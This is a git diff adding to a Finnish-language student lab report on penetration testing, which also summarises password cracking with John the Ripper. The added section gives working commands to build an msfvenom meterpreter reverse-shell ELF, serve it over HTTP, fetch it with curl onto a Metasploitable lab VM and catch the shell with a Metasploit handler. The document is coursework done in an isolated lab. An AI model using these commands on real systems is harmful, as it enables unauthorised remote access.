@@ -37,6 +37,7 @@ x)
   tiivisteitä murrettavaan tiivisteeseen.
 - Ohjeet John-työkalun asentamiseen. Sen avulla voidaan murtaa salasanoja esimerkiksi zip-tiedostoihin. Ohjeissa on valmis zip-tiedosto jonka murtamista harjoitellaan.
 - Hyökkäyksien estäminen ja korjaaminen on jatkuvaa kissa ja hiiri leikkiä. Salasanat täytyy pitää suojattuna sekä liikkeessä että varastoinnissa. Helpoin tapa murtaa salasana on kokeilla yleisimpiä salasanoja. Julkisten paikkojen Wifi-yhteyksien liikenne on harvoin salattua. Joten liikennetta nuuskimalla voi helposti saada käsiinsä salasanoja. Salasanojen murtaminen on helppoa nykyaikana koska laskentateho on nousussa, käytetään yhä heikkoja salasanoja, paljon sanakirjoja joita voi käyttää hyödyksi. John the ripper erinomainen työkalu salasanojen murtamiseen. Hashcat myös hyvä ja nopeampi vaihtoehto salasanojen murtamisenn. Salasanoja täytyy parantaa: käyttää suolausta, parempia tiivisteitä, pidempiä ja monimutkaisia ja uniikkeja salasanoja, kaksisuuntainen vahvistus.
+- Komento mitä käyttää voisi esimerkiksi olla `msfvenom -p <PAYLOAD> -e <ENCODER> -f <FORMAT> -i <ENCODE COUNT> LHOST=<IP>`
 
   a)
 
@@ -203,6 +204,42 @@ Lopuksi ajetaan komento`sudo john --wordlist=/usr/share/wordlists/salasanoja.txt
 Ja kappas se toimi. Matin salasana on murrettu.
 
 [Kyseinen](https://www.youtube.com/watch?v=5MLprTAxYDA&t=10s) video toimi apuna tähän tehtävään.
+
+
+
+g)
+
+Hyökkäykseen löytyi taas sopiva [video](https://www.youtube.com/watch?v=ZqWfDrD2WVY) joten seurataan sen ohjeita.
+
+Aloitetaan varmistamalla molempien koneiden ip osoitteet, sekä että koneet ovat yhteydessä toisiinsa.
+
+Ajetaan komento `msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=192.168.56.6 lport=5555 -f elf > reverse.elf` joka otettiin [msfvenom](https://book.hacktricks.xyz/generic-methodologies-and-resources/reverse-shells/msfvenom) cheat sheetistä. Komento luo haittatiedoston reverse.elf
+
+Sitten ajetaan komento `python3 -m http.server` joka laittaa webbiserverin käyntiin, joka sisältää juuri tehdyn haittaohjelman.
+
+Otetaan uusi terminaali-ikkuna ja mennään msfconsoleen. Käytetään siellä multi/handler exploittia. Ajetaan komento `use exploit/multi/handler`
+
+Sitten asetetaan payload komennolla `set payload linux/x86/meterpreter/reverse_tcp`, jonka jälkeen määritetään lhost eli kalin ip osoitie ja kuunteleva portti lport.
+![Näyttökuva 2024-11-18 kello 13 44 49](https://github.com/user-attachments/assets/f4e8233a-e179-433a-bba1-a01ae6a1df62)
+Yläpuolella kuva asetuksista.
+
+Lopuksi ajetaan komento `exploit`, jonka jälkeen kalissa on kuuntelija portissa 5555.
+![Näyttökuva 2024-11-18 kello 13 46 34](https://github.com/user-attachments/assets/444e5a8e-a532-4505-9fd5-42f5d8a7c8bf)
+
+Siirrytään metasploitableen jolla yritetään ladata myrytetty tiedosto.
+
+Ladataan metasplotablessa aiemmin luotu hyökkäystiedosto komennolla `curl -o reverse.elf 192.168.56.6:8000/reverse.elf`
+
+![Näyttökuva 2024-11-18 kello 14 07 51](https://github.com/user-attachments/assets/530152dc-0d40-4bd0-a1cb-853a3d342c74)
+
+Sitten puuttuu vain tiedoston avaaminen. Annetaan tiedostolle oikeat oikeudet, ja ajetaan se.
+
+![Näyttökuva 2024-11-18 kello 14 14 25](https://github.com/user-attachments/assets/a1ee2333-75de-4bf8-9491-10962d364b82)
+
+Ja niin saatiin reverse shell yhteys metasploitableen.
+![Näyttökuva 2024-11-18 kello 14 15 16](https://github.com/user-attachments/assets/2e0a6502-d3ca-4705-abd6-1297feeb55dd)
+
+
 
 
 
